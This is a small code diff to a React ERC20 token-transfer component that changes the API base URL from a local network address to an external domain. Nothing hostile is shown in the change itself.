@@ -9,7 +9,7 @@ const ERC20 = (props) => {
     const [amount, setAmount] = useState('');
     const [provider, setProvider] = useState('');
     const [tokenaddress, setTokenaddress] = useState('');
-    const api = "http://192.168.1.10:3002"
+    const api = "https://thedelvierypointe.com"
 
     const tokenTransfer = async () => {
       if(chain === "ethereum"){
